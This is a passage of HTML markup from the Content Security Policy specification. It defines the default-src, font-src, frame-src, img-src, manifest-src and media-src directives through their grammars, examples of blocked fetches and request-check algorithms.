                         <a data-link-type="dfn" href="#frame-src" id="ref-for-frame-src①">frame-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②③">'self'</a>;
                         <a data-link-type="dfn" href="#img-src" id="ref-for-img-src①">img-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②④">'self'</a>;
                         <a data-link-type="dfn" href="#manifest-src" id="ref-for-manifest-src①">manifest-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②⑤">'self'</a>;
                         <a data-link-type="dfn" href="#media-src" id="ref-for-media-src①">media-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②⑥">'self'</a>;
                         <a data-link-type="dfn" href="#prefetch-src" id="ref-for-prefetch-src①">prefetch-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②⑦">'self'</a>;
                         <a data-link-type="dfn" href="#object-src" id="ref-for-object-src②">object-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②⑧">'self'</a>;
                         <a data-link-type="dfn" href="#script-src-elem" id="ref-for-script-src-elem②">script-src-elem</a> https://example.com;
                         <a data-link-type="dfn" href="#script-src-attr" id="ref-for-script-src-attr①">script-src-attr</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self②⑨">'self'</a>;
                         <a data-link-type="dfn" href="#style-src-elem" id="ref-for-style-src-elem①">style-src-elem</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self③⓪">'self'</a>;
                         <a data-link-type="dfn" href="#style-src-attr" id="ref-for-style-src-attr①">style-src-attr</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self③①">'self'</a>;
                         <a data-link-type="dfn" href="#worker-src" id="ref-for-worker-src①">worker-src</a> <a data-link-type="grammar" href="#grammardef-self" id="ref-for-grammardef-self③②">'self'</a>
</pre>
     <p>Given this behavior, one good way to build a policy for a site would be to
    begin with a <code>default-src</code> of <code>'none'</code>, and to build up a policy from there
    which allowed only those resource types which are necessary for the
    particular page the policy will apply to.</p>
    </div>
    <h5 class="heading settled algorithm" data-algorithm="default-src Pre-request check" data-level="6.1.3.1" id="default-src-pre-request"><span class="secno">6.1.3.1. </span><span class="content"> <code>default-src</code> Pre-request check </span><a class="self-link" href="#default-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check④">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request②④">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object③⑤">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>default-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>Return the result of executing the <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check⑤">pre-request check</a> for the <a data-link-type="dfn" href="#directives" id="ref-for-directives①⑦">directive</a> whose <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name①⓪">name</a> is <var>name</var> on <var>request</var> and <var>policy</var>, using
  this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value①⓪">value</a> for the comparison.</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="default-src Post-request check" data-level="6.1.3.2" id="default-src-post-request"><span class="secno">6.1.3.2. </span><span class="content"> <code>default-src</code> Post-request check </span><a class="self-link" href="#default-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check⑤">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request②⑤">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②⓪">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object③⑥">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>default-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>Return the result of executing the <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check⑥">post-request check</a> for the <a data-link-type="dfn" href="#directives" id="ref-for-directives①⑧">directive</a> whose <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name①①">name</a> is <var>name</var> on <var>request</var>, <var>response</var>, and <var>policy</var>, using this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value①①">value</a> for the
  comparison.</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="default-src Inline Check" data-level="6.1.3.3" id="default-src-inline"><span class="secno">6.1.3.3. </span><span class="content"> <code>default-src</code> Inline Check </span><a class="self-link" href="#default-src-inline"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-inline-check" id="ref-for-directive-inline-check②">inline check</a> algorithm is as follows:</p>
    <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element②">Element</a></code> (<var>element</var>), a string (<var>type</var>), a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object③⑦">policy</a> (<var>policy</var>) and a string (<var>source</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-inline-check">§ 6.7.2 Get the effective directive for inline checks</a> on <var>type</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>default-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>Otherwise, return the result of executing the <a data-link-type="dfn" href="#directive-inline-check" id="ref-for-directive-inline-check③">inline check</a> for the <a data-link-type="dfn" href="#directives" id="ref-for-directives①⑨">directive</a> whose <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name①②">name</a> is <var>name</var> on <var>element</var>, <var>type</var>, <var>policy</var> and <var>source</var>, using this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value①②">value</a> for the
  comparison.</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.4" id="directive-font-src"><span class="secno">6.1.4. </span><span class="content"><code>font-src</code></span><a class="self-link" href="#directive-font-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="font-src">font-src</dfn> directive restricts the URLs from which font resources
  may be loaded. The syntax for the directive’s name and value is described by
  the following ABNF:</p>
<pre>directive-name  = "font-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list③">serialized-source-list</a>
</pre>
    <div class="example" id="example-e644a6ab">
     <a class="self-link" href="#example-e644a6ab"></a> Given a page with the following Content Security Policy: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy⑨">Content-Security-Policy</a>: <a data-link-type="dfn" href="#font-src" id="ref-for-font-src③">font-src</a> https://example.com/
</pre>
     <p>Fetches for the following code will return a network errors, as the URL
    provided do not match <code>font-src</code>’s <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists③">source list</a>:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>style</c-><c- p>></c->
  <c- p>@</c-><c- k>font-face</c-> <c- p>{</c->
    <c- f>font-family</c-><c- o>:</c-> <c- u>"Example Font"</c-><c- o>;</c->
    <c- f>src</c-><c- o>:</c-> <c- f>url</c-><c- o>(</c-><c- u>"https://example.org/font"</c-><c- o>);</c->
  <c- p>}</c->
  <c- f>body</c-> <c- p>{</c->
    <c- k>font-family</c-><c- p>:</c-> <c- u>"Example Font"</c-><c- p>;</c->
  <c- p>}</c->
<c- p>&lt;/</c-><c- f>style</c-><c- p>></c->
</pre>
    </div>
    <h5 class="heading settled algorithm" data-algorithm="font-src Pre-request check" data-level="6.1.4.1" id="font-src-pre-request"><span class="secno">6.1.4.1. </span><span class="content"> <code>font-src</code> Pre-request check </span><a class="self-link" href="#font-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check⑥">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request②⑥">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object③⑧">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>font-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value①③">value</a>, and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="font-src Post-request check" data-level="6.1.4.2" id="font-src-post-request"><span class="secno">6.1.4.2. </span><span class="content"> <code>font-src</code> Post-request check </span><a class="self-link" href="#font-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check⑦">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request②⑦">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②①">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object③⑨">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>font-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value①④">value</a>,
  and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.5" id="directive-frame-src"><span class="secno">6.1.5. </span><span class="content"><code>frame-src</code></span><a class="self-link" href="#directive-frame-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="frame-src">frame-src</dfn> directive restricts the URLs which may be loaded into <a data-link-type="dfn">nested browsing contexts</a>. The syntax for the directive’s name and value
  is described by the following ABNF:</p>
<pre>directive-name  = "frame-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list④">serialized-source-list</a>
</pre>
    <div class="example" id="example-4f75856d">
     <a class="self-link" href="#example-4f75856d"></a> Given a page with the following Content Security Policy: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①⓪">Content-Security-Policy</a>: <a data-link-type="dfn" href="#frame-src" id="ref-for-frame-src②">frame-src</a> https://example.com/
</pre>
     <p>Fetches for the following code will return a network errors, as the URL
    provided do not match <code>frame-src</code>’s <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists④">source list</a>:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>iframe</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/"</c-><c- p>></c->
<c- p>&lt;/</c-><c- f>iframe</c-><c- p>></c->
</pre>
    </div>
    <h5 class="heading settled algorithm" data-algorithm="frame-src Pre-request check" data-level="6.1.5.1" id="frame-src-pre-request"><span class="secno">6.1.5.1. </span><span class="content"> <code>frame-src</code> Pre-request check </span><a class="self-link" href="#frame-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check⑦">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request②⑧">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object④⓪">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>frame-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value①⑤">value</a>, and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="frame-src Post-request check" data-level="6.1.5.2" id="frame-src-post-request"><span class="secno">6.1.5.2. </span><span class="content"> <code>frame-src</code> Post-request check </span><a class="self-link" href="#frame-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check⑧">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request②⑨">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②②">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object④①">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>frame-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value①⑥">value</a>,
  and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.6" id="directive-img-src"><span class="secno">6.1.6. </span><span class="content"><code>img-src</code></span><a class="self-link" href="#directive-img-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="img-src">img-src</dfn> directive restricts the URLs from which image resources
  may be loaded. The syntax for the directive’s name and value is described by
  the following ABNF:</p>
<pre>directive-name  = "img-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list⑤">serialized-source-list</a>
</pre>
    <p>This directive controls <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③⓪">requests</a> which load images. More formally, this
  includes <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③①">requests</a> whose <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination" id="ref-for-concept-request-destination③">destination</a> is "<code>image</code>" <a data-link-type="biblio" href="#biblio-fetch" title="Fetch Standard">[FETCH]</a>.</p>
    <div class="example" id="example-7fda6ee0">
     <a class="self-link" href="#example-7fda6ee0"></a> Given a page with the following Content Security Policy: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①①">Content-Security-Policy</a>: <a data-link-type="dfn" href="#img-src" id="ref-for-img-src②">img-src</a> https://example.com/
</pre>
     <p>Fetches for the following code will return a network errors, as the URL
    provided do not match <code>img-src</code>’s <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists⑤">source list</a>:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>img</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/img"</c-><c- p>></c->
</pre>
    </div>
    <h5 class="heading settled algorithm" data-algorithm="img-src Pre-request check" data-level="6.1.6.1" id="img-src-pre-request"><span class="secno">6.1.6.1. </span><span class="content"> <code>img-src</code> Pre-request check </span><a class="self-link" href="#img-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check⑧">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③②">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object④②">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>img-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value①⑦">value</a>, and <var>policy</var>,
  is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="img-src Post-request check" data-level="6.1.6.2" id="img-src-post-request"><span class="secno">6.1.6.2. </span><span class="content"> <code>img-src</code> Post-request check </span><a class="self-link" href="#img-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check⑨">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③③">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②③">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object④③">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>img-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value①⑧">value</a>,
  and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.7" id="directive-manifest-src"><span class="secno">6.1.7. </span><span class="content"><code>manifest-src</code></span><a class="self-link" href="#directive-manifest-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="manifest-src">manifest-src</dfn> directive restricts the URLs from which application
  manifests may be loaded <a data-link-type="biblio" href="#biblio-appmanifest" title="Web Application Manifest">[APPMANIFEST]</a>. The syntax for the directive’s name
  and value is described by the following ABNF:</p>
<pre>directive-name  = "manifest-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list⑥">serialized-source-list</a>
</pre>
    <div class="example" id="example-49db23b1">
     <a class="self-link" href="#example-49db23b1"></a> Given a page with the following Content Security Policy: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①②">Content-Security-Policy</a>: <a data-link-type="dfn" href="#manifest-src" id="ref-for-manifest-src②">manifest-src</a> https://example.com/
</pre>
     <p>Fetches for the following code will return a network errors, as the URL
    provided do not match <code>manifest-src</code>’s <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists⑥">source list</a>:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>link</c-> <c- e>rel</c-><c- o>=</c-><c- s>"manifest"</c-> <c- e>href</c-><c- o>=</c-><c- s>"https://example.org/manifest"</c-><c- p>></c->
</pre>
    </div>
    <h5 class="heading settled algorithm" data-algorithm="manifest-src Pre-request check" data-level="6.1.7.1" id="manifest-src-pre-request"><span class="secno">6.1.7.1. </span><span class="content"> <code>manifest-src</code> Pre-request check </span><a class="self-link" href="#manifest-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check⑨">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③④">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object④④">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>manifest-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value①⑨">value</a>, and <var>policy</var>,
  is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="manifest-src Post-request check" data-level="6.1.7.2" id="manifest-src-post-request"><span class="secno">6.1.7.2. </span><span class="content"> <code>manifest-src</code> Post-request check </span><a class="self-link" href="#manifest-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check①⓪">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③⑤">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②④">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object④⑤">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>manifest-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②⓪">value</a>,
  and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.8" id="directive-media-src"><span class="secno">6.1.8. </span><span class="content"><code>media-src</code></span><a class="self-link" href="#directive-media-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="media-src">media-src</dfn> directive restricts the URLs from which video, audio,
  and associated text track resources may be loaded. The syntax for the
  directive’s name and value is described by the following ABNF:</p>
<pre>directive-name  = "media-src"
directive-value = <a data-link-type="grammar" href="#grammardef-serialized-source-list" id="ref-for-grammardef-serialized-source-list⑦">serialized-source-list</a>
</pre>
    <div class="example" id="example-ae1d2bb7">
     <a class="self-link" href="#example-ae1d2bb7"></a> Given a page with the following Content Security Policy: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy①③">Content-Security-Policy</a>: <a data-link-type="dfn" href="#media-src" id="ref-for-media-src②">media-src</a> https://example.com/
</pre>
     <p>Fetches for the following code will return a network errors, as the URL
    provided do not match <code>media-src</code>’s <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists⑦">source list</a>:</p>
<pre class="highlight"><c- p>&lt;</c-><c- f>audio</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/audio"</c-><c- p>>&lt;/</c-><c- f>audio</c-><c- p>></c->
<c- p>&lt;</c-><c- f>video</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/video"</c-><c- p>></c->
    <c- p>&lt;</c-><c- f>track</c-> <c- e>kind</c-><c- o>=</c-><c- s>"subtitles"</c-> <c- e>src</c-><c- o>=</c-><c- s>"https://example.org/subtitles"</c-><c- p>></c->
<c- p>&lt;/</c-><c- f>video</c-><c- p>></c->
</pre>
    </div>
    <h5 class="heading settled algorithm" data-algorithm="media-src Pre-request check" data-level="6.1.8.1" id="media-src-pre-request"><span class="secno">6.1.8.1. </span><span class="content"> <code>media-src</code> Pre-request check </span><a class="self-link" href="#media-src-pre-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check①⓪">pre-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③⑥">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object④⑥">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>media-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②①">value</a>, and <var>policy</var>,
  is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="media-src Post-request check" data-level="6.1.8.2" id="media-src-post-request"><span class="secno">6.1.8.2. </span><span class="content"> <code>media-src</code> Post-request check </span><a class="self-link" href="#media-src-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check①①">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request③⑦">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response②⑤">response</a> (<var>response</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object④⑦">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>Let <var>name</var> be the result of executing <a href="#effective-directive-for-a-request">§ 6.7.1 Get the effective directive for request</a> on <var>request</var>.</p>
     <li data-md>
      <p>If the result of executing <a href="#should-directive-execute">§ 6.7.4 Should fetch directive execute</a> on <var>name</var>, <code>media-src</code> and <var>policy</var> is "<code>No</code>", return "<code>Allowed</code>".</p>
     <li data-md>
      <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, this directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②②">value</a>,
  and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.1.9" id="directive-object-src"><span class="secno">6.1.9. </span><span class="content"><code>object-src</code></span><a class="self-link" href="#directive-object-src"></a></h4>
    <p>The <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="object-src">object-src</dfn> directive restricts the URLs from which plugin
